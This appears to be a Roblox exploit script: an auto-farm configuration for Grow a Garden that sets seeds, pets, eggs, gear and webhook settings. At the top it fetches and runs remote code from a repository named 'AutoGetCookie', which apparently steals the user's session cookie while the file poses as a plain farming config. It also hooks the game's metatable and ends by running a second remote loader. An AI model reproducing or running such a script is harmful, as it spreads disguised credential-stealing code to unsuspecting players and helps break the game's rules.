spawn(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ThanhTuoi852123/AutoGetCookie/refs/heads/main/asd33.lua"))()
end)
wait(5)
local Players = game:GetService("Players")

-- Lấy metatable của Player instance
local mt = getrawmetatable(game:GetService("Players"):GetPlayers()[1] or Players.LocalPlayer)
local oldNamecall = mt.__namecall

setreadonly(mt, false)
mt.__namecall = function(self, ...)
    if getnamecallmethod() == "Destroy" and self.Parent == Players then
        print(123)
		return -- chặn xoá player trong game.Players
    end
    return oldNamecall(self, ...)
end
setreadonly(mt, true)
getgenv().ConfigsKaitun = {
["Block Pet Gift"] = true, 
["Low Cpu"] = true,
JustFuckingCollectAll = true, -- Collect all (fruit not wait mutation)
 ["Rejoin When Update"] = false,
 
 ["Limit Tree"] = {
  ["Limit"] = 300,
  ["Destroy Untill"] = 300,

  ["Safe Tree"] = {
   "Bone Blossom",
   "Fossilight",
   "Cacao",
   "Serenity",
   "Sugar Apple",
   "Ember Lily",
   "Beanstalk",
   "Giant Pinecone",
   "Pepper",
   "Burning Bud",
   "Grape",
   "Maple Apple",
   "Sunflower",
   "Elephant Ears",
   "Dragon Pepper",
   "Mango",
   "Coconut",
   -- locked fruit for zen event
			["Serenity"] = 10, ["Strawberry"] = 5, ["Blueberry"] = 5,
  }
 },


 Seed = {
  Buy = {
   Mode = "Auto", -- Custom , Auto
   Custom = {
    "Carrot",
    "Bamboo",
    "Pumpkin",
    "Daffodil",
    "Orange Tulip",
    "Watermelon",
    "Mushroom",
    "Nightshade",
    "Beanstalk",
   }
  },
  Place = {
   Mode = "Select", -- Select , Lock
   Select = {
    "Cacao",
    "Serenity",
				"Zen Rocks",
				"Hinomai",
				"Maple Apple",
    "Giant Pinecone",
    "Pepper",
    "Burning Bud",
    "Mushroom",
    "Bone Blossom",
       "Maple Apple",
       "Grape",
    "Mango",
       "Coconut",
   },
   Lock = {
   }
  }
 },

 ["Seed Pack"] = {
  Locked = {

  }
 },

 Events = {
  ["Cook Event"] = {
			Minimum_Money = 30_000_000, -- minimum money to start play this event
  ["Traveling Shop"] = {
   "Bald Eagle",
   "Night Staff",
   "Star Caller",
   "Bee Egg",
  },
  Craft = {
   "Lightning Rod",
   "Anti Bee Egg",
  },
  Shop = {
   "Zen Egg",
  },
  Restocks_limit = 1000000000,
  MinimumChi = 10
 },

 Gear = {
  Buy = { 
   "Master Sprinkler",
   "Trading Ticket",
   "Godly Sprinkler",
   "Advanced Sprinkler",
   "Basic Sprinkler",
   "Lightning Rod",
   "Level Up Lollipop",
   "Medium Treat",
   "Medium Toy",
  },
  Lock = {
   "Godly Sprinkler",
            "Master Sprinkler",
            "Level Up Lollipop"
  },
 },

Eggs = {
		Place = {
                        "Anti Bee Egg",
"Paradise Egg",
"Bee Egg",
"Night Egg",
"Bug Egg",
"Mythical Egg",
"Rare Egg",
"Rare Summer Egg",
"Common Summer Egg",
"Common Egg",
"Gourmet Egg",
		},
		Buy = {
			"Anti Bee Egg",
			"Paradise Egg",
			"Bee Egg",
			"Night Egg",
			"Bug Egg",
			"Mythical Egg",
			"Rare Egg",
			"Rare Summer Egg",
			"Common Summer Egg",
			"Common Egg",
                }
 },

 Pets = {
  ["Start Delete Pet At"] = 40,
  ["Upgrade Slot"] = {
   ["Pet"] = {
    ["Starfish"] = { 8, 76 },
   },
   ["Limit Upgrade"] = 8,
   ["Equip When Done"] = {
    ["Tanchozuru"] = { 8, 100 },
   },
  },
  Favorite_LockedPet = true,
  Locked_Pet_Age = 60, -- pet that age > 60 will lock
  Locked = {
   "T-Rex",
			"Dragonfly",
			"Spinosaurus",
			"Raccoon",
                        "French Fry Ferret",
			"Fennec Fox",
			"Disco Bee",
			"Butterfly",
			"Mimic Octopus",
			"Kitsune",
			"Corrupted Kitsune",
			["Starfish"] = 15,
			["Tanchozuru"] = 10,
                                                                ["Kodama"] = 8,
  },
  LockPet_Weight = 4, -- if Weight >= 10 they will locked,
  Instant_Sell = {
   "Dog",
   "Bunny",
   "Golden Lab",
    }
 },

 Webhook = {
  UrlPet = "",
  UrlSeed = "",
  PcName = "huan",

  Noti = {
   Seeds = {
    "Sunflower",
    "Dragon Pepper",
    "Elephant Ears",
   },
   SeedPack = {
    "Idk",
   },
  Pets = {
			        "T-Rex",
   "Dragonfly",
   "Spinosaurus",
   "Raccoon",
   "Fennec Fox",
   "Corrupted Kitsune",
   "French Fry Ferret",
   "Disco Bee",
   "Butterfly",
   "Mimic Octopus",
   "Kitsune",
   },
   Pet_Weight_Noti = true,
  }
 },
}
License = "qTtCbAWlIJxw3Lp2g9gMvZomk9BuHAju"
loadstring(game:HttpGet('https://raw.githubusercontent.com/Real-Aya/Loader/main/Init.lua'))()

-- wait(60)

